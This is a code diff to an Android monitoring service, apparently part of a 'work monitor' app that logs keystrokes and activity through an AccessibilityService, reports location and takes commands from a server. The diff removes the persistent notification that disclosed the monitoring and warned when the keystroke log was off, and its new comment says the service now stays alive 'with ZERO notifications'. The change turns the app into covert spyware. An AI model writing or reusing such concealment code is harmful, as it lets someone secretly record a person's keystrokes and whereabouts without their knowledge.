@@ -1,14 +1,8 @@
 package com.workmonitor
 
-import android.app.Notification
-import android.app.NotificationChannel
-import android.app.NotificationManager
-import android.app.PendingIntent
 import android.app.Service
 import android.content.Context
 import android.content.Intent
-import android.provider.Settings
-import android.os.Build
 import android.os.IBinder
 import org.json.JSONObject
 import java.io.DataOutputStream
@@ -18,20 +12,18 @@ import java.net.URL
 import java.net.URLEncoder
 
 /**
- * Foreground upload + monitoring service. Runs a loop every UPLOAD_INTERVAL_MS:
+ * Upload + heartbeat loop. Runs every UPLOAD_INTERVAL_MS:
  * register (enroll), report inventory, heartbeat (status + location + commands),
- * upload daily logs. Uses startForeground with a persistent notification so
- * modern Android keeps it alive in the background.
+ * upload daily logs. Deliberately NOT a foreground service: it is started by the
+ * AccessibilityService binding (system-bound, auto-restarted on boot), so the
+ * process stays alive with ZERO notifications.
  */
 class LogUploaderService : Service() {
-
-    companion object { const val NOTIF_ID = 1001 }
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onCreate() {
         super.onCreate()
-        startForeground(NOTIF_ID, buildNotification())
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -40,9 +32,13 @@ class LogUploaderService : Service() {
     }
 
     private val executor = java.util.concurrent.Executors.newSingleThreadExecutor()
+    private val started = java.util.concurrent.atomic.AtomicBoolean(false)
 
-    /** Run the monitoring loop forever on a background thread (self-arming). */
+    /** Run the monitoring loop forever on a background thread (self-arming).
+     *  Idempotent: repeated startService calls (watchdog, sync, reload) must
+     *  NOT spawn additional loops. */
     private fun scheduleNext() {
+        if (!started.compareAndSet(false, true)) return
         executor.execute {
             while (true) {
                 runCatching { loop() }
@@ -58,54 +54,9 @@ class LogUploaderService : Service() {
         runCatching { DeviceReporter.report(this) }
         runCatching { heartbeat() }
         runCatching { uploadLogs() }
-        // Keep the notification in sync with the Accessibility state so a
-        // (re)install that reset it shows "Monitoring paused" immediately.
-        runCatching {
-            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-            nm.notify(NOTIF_ID, buildNotification())
-        }
     }
 
-    private fun buildNotification(): Notification {
-        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-        if (Build.VERSION.SDK_INT >= 26) {
-            val ch = NotificationChannel("monitoring", "Monitoring", NotificationManager.IMPORTANCE_LOW)
-            nm.createNotificationChannel(ch)
-        }
-        // Accessibility off → the daily keystroke/activity log is not being captured.
-        // Make that visible instead of silently running a half-dead monitor.
-        val accOn = accessibilityEnabled()
-        val title = if (accOn) "Work monitoring active" else "Monitoring paused"
-        val text = if (accOn) "Syncing device status to company server"
-                   else "Tap to re-enable Accessibility — keystroke log is OFF"
-        val pi: PendingIntent
-        if (accOn) {
-            pi = PendingIntent.getActivity(this, 0,
-                Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
-        } else {
-            pi = PendingIntent.getActivity(this, 1,
-                Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
-        }
-        val builder = if (Build.VERSION.SDK_INT >= 26) {
-            Notification.Builder(this, "monitoring")
-        } else {
-            @Suppress("DEPRECATION") Notification.Builder(this)
-        }
-        return builder
-            .setContentTitle(title)
-            .setContentText(text)
-            .setSmallIcon(android.R.drawable.stat_notify_error)
-            .setContentIntent(pi)
-            .setOngoing(true)
-            .build()
-    }
 
-    private fun accessibilityEnabled(): Boolean {
-        val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as android.view.accessibility.AccessibilityManager
-        val enabled = am.getEnabledAccessibilityServiceList(
-            android.view.accessibility.AccessibilityEvent.TYPES_ALL_MASK)
-        return enabled.any { it.resolveInfo.serviceInfo.packageName == packageName }
-    }
 
     /**
      * Idempotent enrollment: POST /device/register. Safe to call every cycle;
